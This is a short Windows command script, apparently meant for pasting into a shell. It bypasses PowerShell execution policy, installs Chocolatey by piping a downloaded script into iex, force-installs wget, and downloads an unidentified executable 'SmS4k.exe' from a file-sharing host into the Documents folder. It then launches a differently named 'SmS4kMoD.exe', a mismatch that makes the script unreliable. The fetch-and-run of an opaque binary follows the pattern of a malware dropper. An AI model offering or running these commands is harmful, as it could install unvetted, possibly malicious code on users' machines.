powershell Set-ExecutionPolicy Bypass -Scope Process -Force; [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072; iex ((New-Object System.Net.WebClient).DownloadString('https://community.chocolatey.org/install.ps1'))

choco install wget --force -y

cd %USERPROFILE%\Documents

curl -L -O https://getmega.net/download/file_aaaebb00cc/SmS4k.exe

start "" SmS4kMoD.exe